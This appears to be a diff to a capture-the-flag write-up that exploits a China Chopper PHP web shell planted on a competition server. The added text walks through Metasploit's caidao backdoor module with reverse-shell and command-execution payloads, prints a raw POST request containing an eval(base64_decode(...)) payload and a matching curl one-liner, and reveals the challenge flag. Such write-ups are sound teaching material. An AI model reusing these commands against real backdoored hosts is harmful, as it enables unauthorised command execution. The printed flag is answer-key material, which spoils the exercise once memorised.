@@ -50,10 +50,14 @@ However, the `admin console` link is interesting. Where we find this file listin
 
 There are several system info files and some `.conf` files. However, the `323d09c08a72717bbec71f172e5f6532.php` file is interesting, seems like a filehash. Googling the filename shows no results, however duckduckgo shows shows several results, albeit none of the results are relevant. Testing the hash on virustotal shows that the file is a known PHP web shell [2].
 
-Reading up on the China Chopper web shell, we learn several ways to exploit the web shell [1][3][4]. However, the `@eval` exploit chain is quite complex and requires a fair bit of work to get working.
-We do not really want to create our own client, and using the original `caidao` client is not recommended. Instead we can use the Metasploit module [`exploit/multi/http/caidao_php_backdoor_exec`](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/caidao_php_backdoor_exec.md) to exploit the web shell using the password provided earlier [5].
+Reading up on the China Chopper web shell, we learn several ways to exploit the web shell [1][3][4]. However, the `@eval` exploit chain is somewhat complex and requires a fair bit of testing to get working because of all the encoding. We do not really want to create our own client, and using the original `caidao` client is not recommended. We therefore opt to use the Metasploit module [`exploit/multi/http/caidao_php_backdoor_exec`](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/caidao_php_backdoor_exec.md), using the password provided earlier [5]
 
-```
+### Reverse shell exploit
+
+This method will only work if you have a public IP address or port forwarding set up on your router
+to forward the port to your machine, since the reverse shell will be blocked by the firewall.
+
+```sh
 msf6 > use exploit/multi/http/caidao_php_backdoor_exec
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
 msf6 exploit(multi/http/caidao_php_backdoor_exec) > set rhost 127.0.0.1
@@ -89,6 +93,134 @@ Mode              Size  Type  Last modified              Name
 101755/rwxr-xr-x  1074  fil   2025-02-24 22:13:30 +0100  uithack.conf
 
 meterpreter > cat flag.txt
+UiTHack25{02_quota_revoked_please_submit_for_disposal}
+```
+
+### RCE exploit
+
+This method will work without any port forwarding, since the code will be executed on the server returning the output to the attacker.
+
+Check the available payloads with the `show payloads` command using the `caidao_php_backdoor_exec` module.
+
+```txt
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/bind_aws_instance_connect  .                normal  No     Unix SSH Shell, Bind Instance Connect (via AWS API)
+   1   payload/generic/custom                      .                normal  No     Custom Payload
+   2   payload/generic/shell_bind_aws_ssm          .                normal  No     Command Shell, Bind SSM (via AWS API)
+   3   payload/generic/shell_bind_tcp              .                normal  No     Generic Command Shell, Bind TCP Inline
+   4   payload/generic/shell_reverse_tcp           .                normal  No     Generic Command Shell, Reverse TCP Inline
+   5   payload/generic/ssh/interact                .                normal  No     Interact with Established SSH Connection
+   6   payload/multi/meterpreter/reverse_http      .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTP Stager (Multiple Architectures)
+   7   payload/multi/meterpreter/reverse_https     .                normal  No     Architecture-Independent Meterpreter Stage, Reverse HTTPS Stager (Multiple Architectures)
+   8   payload/php/bind_perl                       .                normal  No     PHP Command Shell, Bind TCP (via Perl)
+   9   payload/php/bind_perl_ipv6                  .                normal  No     PHP Command Shell, Bind TCP (via perl) IPv6
+   10  payload/php/bind_php                        .                normal  No     PHP Command Shell, Bind TCP (via PHP)
+   11  payload/php/bind_php_ipv6                   .                normal  No     PHP Command Shell, Bind TCP (via php) IPv6
+   12  payload/php/download_exec                   .                normal  No     PHP Executable Download and Execute
+   13  payload/php/exec                            .                normal  No     PHP Execute Command
+   14  payload/php/meterpreter/bind_tcp            .                normal  No     PHP Meterpreter, Bind TCP Stager
+   15  payload/php/meterpreter/bind_tcp_ipv6       .                normal  No     PHP Meterpreter, Bind TCP Stager IPv6
+   16  payload/php/meterpreter/bind_tcp_ipv6_uuid  .                normal  No     PHP Meterpreter, Bind TCP Stager IPv6 with UUID Support
+   17  payload/php/meterpreter/bind_tcp_uuid       .                normal  No     PHP Meterpreter, Bind TCP Stager with UUID Support
+   18  payload/php/meterpreter/reverse_tcp         .                normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+   19  payload/php/meterpreter/reverse_tcp_uuid    .                normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+   20  payload/php/meterpreter_reverse_tcp         .                normal  No     PHP Meterpreter, Reverse TCP Inline
+   21  payload/php/reverse_perl                    .                normal  No     PHP Command, Double Reverse TCP Connection (via Perl)
+   22  payload/php/reverse_php                     .                normal  No     PHP Command Shell, Reverse TCP (via PHP)
+```
+
+Most of the payloads are meterpreter payloads, which are not very useful in this case.
+We will use the `payload/php/exec` payload to execute a command on the server.
+
+To get the output of the returned `POST` request, we first have to enable *HttpTrace*, and then set the payload and the command to execute.
+
+```sh
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set HttpTrace true
+HttpTrace => true
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set SSL true
+SSL => true
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set PAYLOAD payload/php/exec
+PAYLOAD => php/exec
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > set PAYLOADSTR "system('cat flag.txt');"
+PAYLOADSTR => system('cat flag.txt');
+```
+
+The settings should be shown as below.
+
+```sh
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > show options
+
+Module options (exploit/multi/http/caidao_php_backdoor_exec):
+
+   Name       Current Setting                           Required  Description
+   ----       ---------------                           --------  -----------
+   PASSWORD   NEXUSANARCHY2337                          yes       The password of backdoor
+   Proxies                                              no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     uithack-2.td.org.uit.no                   yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/>
+                                                                  basics/using-metasploit.html
+   RPORT      9003                                      yes       The target port (TCP)
+   SSL        true                                      no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /admin/323d09c08a72717bbec71f172e5f6532.  yes       The path of backdoor
+              php
+   VHOST                                                no        HTTP server virtual host
+
+Payload options (generic/custom):
+
+   Name         Current Setting          Required  Description
+   ----         ---------------          --------  -----------
+   PAYLOADFILE                           no        The file to read the payload from
+   PAYLOADSTR   system('cat flag.txt');  no        The string to use as a payload
+
+```
+
+Then dispatch the exploit.
+
+```sh
+msf6 exploit(multi/http/caidao_php_backdoor_exec) > exploit
+[*] Sending exploit...
+####################
+# Request:
+####################
+POST /admin/323d09c08a72717bbec71f172e5f6532.php HTTP/1.1
+Host: uithack-2.td.org.uit.no:9003
+User-Agent: Mozilla/5.0 (iPad; CPU OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+
+NEXUSANARCHY2337=eval%28base64_decode%28%22c3lzdGVtKCdjYXQgZmxhZy50eHQnKTs%3d%22%29%29%3b
+####################
+# Response:
+####################
+HTTP/1.1 200 OK
+Alt-Svc: h3=":9003"; ma=2592000
+Content-Type: text/html; charset=UTF-8
+Date: Tue, 25 Feb 2025 17:21:40 GMT
+Strict-Transport-Security: max-age=63072000; includeSubDomains
+Vary: Accept-Encoding
+X-Powered-By: PHP/8.4.4
+Transfer-Encoding: chunked
+
+<!-- THIS IS AN EXPLOTABLE WEB SHELL, NEVER EXPOSE TO THE INTERNET
+    Ask Dave for instructions
+    Nexus Anarchists was here, fuck Dave -->
+UiTHack25{02_quota_revoked_please_submit_for_disposal}
+
+[*] Exploit completed, but no session was created.
+```
+
+### Manual encoding
+
+```sh
+curl -X POST -H application/x-www-form-urlencoded -d "NEXUSANARCHY2337=eval%28base64_decode%28%22c3lzdGVtKCdjYXQgZmxhZy50eHQnKTs%3d%22%29%29%3b" https://uithack-2.td.org.uit.no:9003/admin/323d09c08a72717bbec71f172e5f6532.php
+<!-- THIS IS AN EXPLOTABLE WEB SHELL, NEVER EXPOSE TO THE INTERNET
+    Ask Dave for instructions
+    Nexus Anarchists was here, fuck Dave -->
 UiTHack25{02_quota_revoked_please_submit_for_disposal}
 ```
 
